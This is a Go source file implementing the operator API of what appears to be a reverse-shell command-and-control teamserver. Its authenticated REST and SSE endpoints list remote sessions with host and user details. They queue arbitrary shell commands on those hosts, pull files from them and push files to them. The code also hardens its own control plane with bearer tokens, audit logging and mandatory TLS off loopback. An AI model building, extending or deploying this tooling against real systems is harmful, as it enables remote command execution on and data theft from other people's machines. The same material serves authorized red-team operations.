// Package api implements the operator API: the REST+SSE control plane exposed
// by the teamserver (README §5). Operators authenticate with a bearer token
// and never touch the session plane directly.
package api

import (
	"context"
	"crypto/subtle"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"reverseshell/internal/protocol"
)

// SessionView is the operator-facing projection of a session.
type SessionView struct {
	SID         string    `json:"sid"`
	Peer        string    `json:"peer"`
	Hostname    string    `json:"hostname"`
	OS          string    `json:"os"`
	Arch        string    `json:"arch"`
	User        string    `json:"user"`
	PID         int       `json:"pid"`
	State       string    `json:"state"`
	Transport   string    `json:"transport"`
	ConnectedAt time.Time `json:"connected_at"`
	LastSeen    time.Time `json:"last_seen"`
}

// TaskView is the operator-facing projection of a task and its result.
type TaskView struct {
	TID       string               `json:"tid"`
	SID       string               `json:"sid"`
	Kind      string               `json:"kind"`
	Status    string               `json:"status"`
	Result    *protocol.TaskResult `json:"result,omitempty"`
	CreatedAt time.Time            `json:"created_at"`
}

// Event is one SSE event.
type Event struct {
	Type string
	Data json.RawMessage
}

// UploadView describes a queued chunked upload.
type UploadView struct {
	FinalTID string `json:"tid"` // task whose RESULT completes the upload
	Chunks   int    `json:"chunks"`
	Bytes    int    `json:"bytes"`
	SHA256   string `json:"sha256"`
}

// Backend is what the API needs from the teamserver core.
type Backend interface {
	Sessions() []SessionView
	CreateTask(ctx context.Context, sid string, spec protocol.TaskSpec, operator string) (string, error)
	CreateUpload(ctx context.Context, sid, path string, data []byte, operator string) (UploadView, error)
	Task(tid string) (TaskView, bool)
	TaskData(tid string) (data []byte, sha256 string, ok bool)
	SubscribeEvents() (<-chan Event, func())
	Shutdown(ctx context.Context) error
}

// Sentinel backend errors, mapped to HTTP statuses by the handlers.
var (
	ErrUnknownSession   = errors.New("unknown session")
	ErrSessionBusy      = errors.New("session busy")
	ErrTransferTooLarge = errors.New("transfer too large")
)

// Config configures the API server.
type Config struct {
	Addr    string // loopback by default (README §9)
	Token   string // required bearer token
	Backend Backend
	Audit   *slog.Logger // optional: auth failures are audited too

	// Control-plane TLS: required when Addr is not loopback (README §9.2).
	TLSCertFile string
	TLSKeyFile  string
}

// Server serves the operator API.
type Server struct {
	cfg Config
	srv *http.Server
	ln  net.Listener
}

// New validates the config and binds the HTTP listener.
func New(cfg Config) (*Server, error) {
	if cfg.Token == "" {
		return nil, errors.New("api: operator token is required")
	}
	if cfg.Backend == nil {
		return nil, errors.New("api: backend is required")
	}
	if cfg.Addr == "" {
		cfg.Addr = "127.0.0.1:5555"
	}
	// The teamserver is the crown jewel: exposing the operator API off
	// loopback without TLS is a hard error, not a warning (README §9.2).
	if !isLoopbackAddr(cfg.Addr) && (cfg.TLSCertFile == "" || cfg.TLSKeyFile == "") {
		return nil, errors.New("api: exposing the operator API off-loopback requires TLS — set api_cert/api_key")
	}
	ln, err := net.Listen("tcp", cfg.Addr)
	if err != nil {
		return nil, fmt.Errorf("api listen %s: %w", cfg.Addr, err)
	}
	s := &Server{cfg: cfg, ln: ln}
	s.srv = &http.Server{Handler: s.routes()}
	return s, nil
}

// Addr returns the bound API address (useful with port 0).
func (s *Server) Addr() string { return s.ln.Addr().String() }

// Handler returns the routed, authenticated handler (for httptest).
func (s *Server) Handler() http.Handler { return s.srv.Handler }

// Close releases the bound listener.
func (s *Server) Close() error { return s.ln.Close() }

// Run serves until ctx is cancelled, then shuts down gracefully.
func (s *Server) Run(ctx context.Context) error {
	errCh := make(chan error, 1)
	go func() {
		var err error
		if s.cfg.TLSCertFile != "" {
			err = s.srv.ServeTLS(s.ln, s.cfg.TLSCertFile, s.cfg.TLSKeyFile)
		} else {
			err = s.srv.Serve(s.ln)
		}
		errCh <- err
	}()
	select {
	case err := <-errCh:
		if err != nil && !errors.Is(err, http.ErrServerClosed) {
			return err
		}
		return nil
	case <-ctx.Done():
		sctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		_ = s.srv.Shutdown(sctx)
		return nil
	}
}

func (s *Server) routes() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /v1/sessions", s.auth(s.handleSessions))
	mux.HandleFunc("POST /v1/sessions/{sid}/tasks", s.auth(s.handleCreateTask))
	mux.HandleFunc("POST /v1/sessions/{sid}/upload", s.auth(s.handleUpload))
	mux.HandleFunc("GET /v1/tasks/{tid}", s.auth(s.handleTask))
	mux.HandleFunc("GET /v1/tasks/{tid}/download", s.auth(s.handleTaskDownload))
	mux.HandleFunc("GET /v1/events", s.auth(s.handleEvents))
	mux.HandleFunc("POST /v1/shutdown", s.auth(s.handleShutdown))
	mux.HandleFunc("GET /ui", handleUI)
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/ui", http.StatusFound)
	})
	return mux
}

// operatorCtxKey keys the operator identity through the request context.
type operatorCtxKey struct{}

// auth rejects requests without the exact bearer token (constant-time
// compare), audits every rejection, and threads the operator identity
// (X-RS-Operator, default "console") into the request context.
func (s *Server) auth(next func(http.ResponseWriter, *http.Request)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		got := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		if subtle.ConstantTimeCompare([]byte(got), []byte(s.cfg.Token)) != 1 {
			if s.cfg.Audit != nil {
				s.cfg.Audit.LogAttrs(r.Context(), slog.LevelWarn, "operator.auth.failed",
					slog.String("remote", r.RemoteAddr), slog.String("path", r.URL.Path))
			}
			writeJSON(w, http.StatusUnauthorized,
				map[string]string{"error": "invalid or missing bearer token"})
			return
		}
		op := strings.TrimSpace(r.Header.Get("X-RS-Operator"))
		if op == "" {
			op = "console"
		}
		if len(op) > 64 {
			op = op[:64]
		}
		next(w, r.WithContext(context.WithValue(r.Context(), operatorCtxKey{}, op)))
	}
}

// operatorFrom returns the operator identity for audit attribution.
func operatorFrom(r *http.Request) string {
	if v, ok := r.Context().Value(operatorCtxKey{}).(string); ok && v != "" {
		return v
	}
	return "console"
}

func (s *Server) handleSessions(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusOK, s.cfg.Backend.Sessions())
}

func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	var spec protocol.TaskSpec
	dec := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20))
	if err := dec.Decode(&spec); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON body"})
		return
	}
	if err := validateSpec(&spec); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
		return
	}
	tid, err := s.cfg.Backend.CreateTask(r.Context(), r.PathValue("sid"), spec, operatorFrom(r))
	switch {
	case err == nil:
		writeJSON(w, http.StatusAccepted, map[string]string{"tid": tid})
	case errors.Is(err, ErrUnknownSession):
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
	case errors.Is(err, ErrSessionBusy):
		writeJSON(w, http.StatusConflict, map[string]string{"error": err.Error()})
	default:
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
	}
}

func validateSpec(spec *protocol.TaskSpec) error {
	switch spec.Kind {
	case protocol.KindShell:
		if len(spec.Args) == 0 {
			return errors.New("shell task requires args.cmd")
		}
		var a protocol.ShellArgs
		if err := json.Unmarshal(spec.Args, &a); err != nil || a.Cmd == "" {
			return errors.New("shell task requires args.cmd")
		}
	case protocol.KindDownload:
		if len(spec.Args) == 0 {
			return errors.New("download requires args.path")
		}
		var a protocol.DownloadArgs
		if err := json.Unmarshal(spec.Args, &a); err != nil || a.Path == "" {
			return errors.New("download requires args.path")
		}
	case protocol.KindUpload:
		return errors.New("upload uses POST /v1/sessions/{sid}/upload")
	case protocol.KindSysinfo, protocol.KindExit:
		// no args
	default:
		return fmt.Errorf("unknown kind %q (supported: shell, sysinfo, download, exit)", spec.Kind)
	}
	if spec.Timeout < 0 {
		return errors.New("timeout must be >= 0")
	}
	return nil
}

func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
	v, ok := s.cfg.Backend.Task(r.PathValue("tid"))
	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "unknown task"})
		return
	}
	writeJSON(w, http.StatusOK, v)
}

func (s *Server) handleEvents(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "streaming unsupported"})
		return
	}
	events, cancel := s.cfg.Backend.SubscribeEvents()
	defer cancel()

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fmt.Fprint(w, ": connected\n\n")
	flusher.Flush()

	keep := time.NewTicker(20 * time.Second)
	defer keep.Stop()
	for {
		select {
		case ev := <-events:
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", ev.Type, ev.Data)
			flusher.Flush()
		case <-keep.C:
			fmt.Fprint(w, ": keepalive\n\n")
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

// handleUpload pushes one operator file to an agent as chunked upload
// tasks (README §4.5, F5). The body is the raw file; ?path= is the target.
func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("sid")
	path := r.URL.Query().Get("path")
	if path == "" || len(path) > 512 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing or oversized ?path="})
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, protocol.MaxTransferBytes))
	if err != nil {
		writeJSON(w, http.StatusRequestEntityTooLarge,
			map[string]string{"error": "body exceeds the transfer cap"})
		return
	}
	view, err := s.cfg.Backend.CreateUpload(r.Context(), sid, path, body, operatorFrom(r))
	switch {
	case err == nil:
		writeJSON(w, http.StatusAccepted, view)
	case errors.Is(err, ErrUnknownSession):
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
	case errors.Is(err, ErrSessionBusy):
		writeJSON(w, http.StatusConflict, map[string]string{"error": err.Error()})
	case errors.Is(err, ErrTransferTooLarge):
		writeJSON(w, http.StatusRequestEntityTooLarge, map[string]string{"error": err.Error()})
	default:
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
	}
}

// handleTaskDownload returns the assembled payload of a completed
// chunked-download task, with its complete-file hash in X-RS-SHA256.
func (s *Server) handleTaskDownload(w http.ResponseWriter, r *http.Request) {
	tid := r.PathValue("tid")
	data, sha, ok := s.cfg.Backend.TaskData(tid)
	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "no completed download for this task"})
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("X-RS-SHA256", sha)
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=rs-%s.bin", tid))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}

func (s *Server) handleShutdown(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusAccepted, map[string]string{"status": "shutting down"})
	_ = s.cfg.Backend.Shutdown(context.Background())
}

// isLoopbackAddr reports whether addr binds a loopback interface.
func isLoopbackAddr(addr string) bool {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return false
	}
	return host == "127.0.0.1" || host == "::1" || host == "localhost"
}

//go:embed ui/index.html
var uiHTML []byte

// handleUI serves the single-file web console (README §5, F5): the same
// operator API, zero build toolchain. The page is a static shell — all
// data still requires the bearer token.
func handleUI(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(uiHTML)
}

func writeJSON(w http.ResponseWriter, status int, v any) {
	b, err := json.Marshal(v)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte(`{"error":"internal marshal failure"}`))
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_, _ = w.Write(append(b, '\n'))
}
